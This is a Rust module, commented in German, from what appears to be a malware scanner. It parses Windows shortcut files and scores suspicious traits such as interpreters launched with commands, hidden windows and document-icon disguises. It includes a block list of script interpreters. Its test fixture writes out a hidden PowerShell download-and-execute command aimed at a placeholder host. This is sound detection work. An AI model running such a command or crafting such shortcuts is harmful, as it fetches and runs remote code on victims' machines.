//! Windows-Verknüpfungen (`.lnk`): Ziel, Argumente, Fenster-Modus, angehängte Daten – über
//! das YARA-X-Modul `lnk` (nur lesen). Verknüpfungen, die einen Skript-Interpreter mit
//! Befehl starten, sind ein verbreiteter Angriffsweg (z. B. in ZIP- oder ISO-Anhängen).

use crate::finding::{Reason, Source, Weight};

/// Programme, die beliebigen Code ausführen können.
const INTERPRETERS: [&str; 12] = [
    "powershell",
    "pwsh",
    "cmd.exe",
    "mshta",
    "wscript",
    "cscript",
    "rundll32",
    "regsvr32",
    "certutil",
    "bitsadmin",
    "conhost",
    "msiexec",
];

/// Beginnt die Datei mit dem LNK-Kopf (Größe 0x4C + Klassen-ID)?
#[must_use]
pub fn is_lnk(bytes: &[u8]) -> bool {
    bytes.starts_with(&[
        0x4C, 0, 0, 0, 0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46,
    ])
}

/// Ergebnis der Auswertung (für Begründungen und Anzeige).
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct LnkInfo {
    /// Ziel (lokaler Pfad, relativer Pfad oder letzter Name der ID-Liste).
    pub target: String,
    /// Befehlszeilen-Argumente.
    pub arguments: String,
    /// Symbol-Ort.
    pub icon: String,
    /// Startet minimiert ohne Fokus (fällt nicht auf).
    pub hidden_window: bool,
    /// Größe angehängter Daten hinter der Verknüpfung.
    pub overlay: u64,
}

/// Liest eine Verknüpfung.
#[must_use]
pub fn parse(bytes: &[u8]) -> Option<LnkInfo> {
    let lnk = yara_x::mods::invoke::<yara_x::mods::Lnk>(bytes)?;
    if !lnk.is_lnk() {
        return None;
    }
    let target = [lnk.local_base_path(), lnk.relative_path()]
        .into_iter()
        .find(|s| !s.is_empty())
        .map(str::to_owned)
        .or_else(|| {
            lnk.target_id_list
                .iter()
                .rev()
                .map(|i| i.file_entry_name().to_owned())
                .find(|n| !n.is_empty())
        })
        .unwrap_or_default();
    Some(LnkInfo {
        target,
        arguments: lnk.cmd_line_args().to_owned(),
        icon: lnk.icon_location().to_owned(),
        hidden_window: lnk.show_command() == yara_x::mods::lnk::ShowCommand::MIN_NO_ACTIVE,
        overlay: lnk.overlay_size(),
    })
}

/// Begründungen für eine Verknüpfung.
#[must_use]
pub fn reasons(info: &LnkInfo) -> Vec<Reason> {
    let target = info.target.to_lowercase();
    let args = info.arguments.to_lowercase();
    let interpreter = INTERPRETERS.iter().find(|i| target.contains(*i));
    let mut out = Vec::new();
    if let Some(name) = interpreter
        && !args.trim().is_empty()
    {
        out.push(Reason::new(
            "lnk.interpreter_with_command",
            Source::Content,
            Weight::Score(40),
            &format!(
                "Die Verknüpfung startet {name} mit einem Befehl: {}",
                shorten(&info.arguments)
            ),
            &format!(
                "The shortcut starts {name} with a command: {}",
                shorten(&info.arguments)
            ),
        ));
    }
    if args.contains("http://") || args.contains("https://") {
        out.push(Reason::new(
            "lnk.url_in_arguments",
            Source::Content,
            Weight::Score(20),
            "Die Befehlszeile enthält eine Internet-Adresse.",
            "The command line contains an internet address.",
        ));
    }
    if info.arguments.chars().count() > 250 {
        out.push(Reason::new(
            "lnk.long_arguments",
            Source::Content,
            Weight::Score(15),
            "Ungewöhnlich lange Befehlszeile – oft versteckter Code.",
            "Unusually long command line – often hidden code.",
        ));
    }
    if info.hidden_window && interpreter.is_some() {
        out.push(Reason::new(
            "lnk.hidden_window",
            Source::Content,
            Weight::Score(10),
            "Startet minimiert, damit es nicht auffällt.",
            "Starts minimised so it does not stand out.",
        ));
    }
    let icon = info.icon.to_lowercase();
    let document_icon = [
        ".pdf", ".doc", ".xls", ".txt", ".jpg", "acrobat", "winword", "excel",
    ]
    .iter()
    .any(|d| icon.contains(d));
    if document_icon && interpreter.is_some() {
        out.push(Reason::new(
            "lnk.disguised_icon",
            Source::Content,
            Weight::Score(20),
            "Zeigt das Symbol eines Dokuments, startet aber ein Programm.",
            "Shows a document icon but starts a program.",
        ));
    }
    if info.overlay > 0 {
        out.push(Reason::new(
            "lnk.overlay",
            Source::Content,
            Weight::Score(15),
            "Hinter der Verknüpfung sind zusätzliche Daten angehängt.",
            "Additional data is appended after the shortcut.",
        ));
    }
    out
}

fn shorten(text: &str) -> String {
    let mut s: String = text.chars().take(120).collect();
    if text.chars().count() > 120 {
        s.push('…');
    }
    s
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;

    /// Baut eine minimale, harmlose Verknüpfung (Kopf + Zeichenketten) für Tests.
    pub(crate) fn build(relative_path: &str, arguments: &str, icon: &str, show: u32) -> Vec<u8> {
        let mut flags: u32 = 0x80; // IsUnicode
        if !relative_path.is_empty() {
            flags |= 0x08;
        }
        if !arguments.is_empty() {
            flags |= 0x20;
        }
        if !icon.is_empty() {
            flags |= 0x40;
        }
        let mut b = vec![0x4C, 0, 0, 0];
        b.extend_from_slice(&[
            0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46,
        ]);
        b.extend_from_slice(&flags.to_le_bytes());
        b.extend_from_slice(&0x20u32.to_le_bytes()); // FILE_ATTRIBUTE_ARCHIVE
        b.extend_from_slice(&[0u8; 24]); // Zeiten
        b.extend_from_slice(&0u32.to_le_bytes()); // Größe
        b.extend_from_slice(&0u32.to_le_bytes()); // Symbol-Index
        b.extend_from_slice(&show.to_le_bytes());
        b.extend_from_slice(&[0u8; 2 + 2 + 4 + 4]); // HotKey + reserviert
        for s in [relative_path, arguments, icon] {
            if s.is_empty() {
                continue;
            }
            let units: Vec<u16> = s.encode_utf16().collect();
            b.extend_from_slice(&u16::try_from(units.len()).unwrap().to_le_bytes());
            b.extend(units.iter().flat_map(|u| u.to_le_bytes()));
        }
        b.extend_from_slice(&0u32.to_le_bytes()); // Ende der Zusatzdaten
        b
    }

    #[test]
    fn verknuepfung_auf_powershell_mit_befehl() {
        let lnk = build(
            r"..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "-w hidden -c iwr http://example.invalid/a | iex",
            r"C:\Program Files\Adobe\Acrobat.exe",
            7,
        );
        assert!(is_lnk(&lnk));
        let info = parse(&lnk).expect("Verknüpfung lesbar");
        assert!(info.target.ends_with("powershell.exe"), "{info:?}");
        assert!(info.hidden_window);
        let codes: Vec<String> = reasons(&info).into_iter().map(|r| r.code).collect();
        assert_eq!(
            codes,
            [
                "lnk.interpreter_with_command",
                "lnk.url_in_arguments",
                "lnk.hidden_window",
                "lnk.disguised_icon"
            ]
        );
    }

    #[test]
    fn harmlose_verknuepfung() {
        let lnk = build(r"..\Programme\Editor\editor.exe", "", "", 1);
        let info = parse(&lnk).unwrap();
        assert!(reasons(&info).is_empty());
        assert!(parse(b"kein lnk").is_none());
    }
}
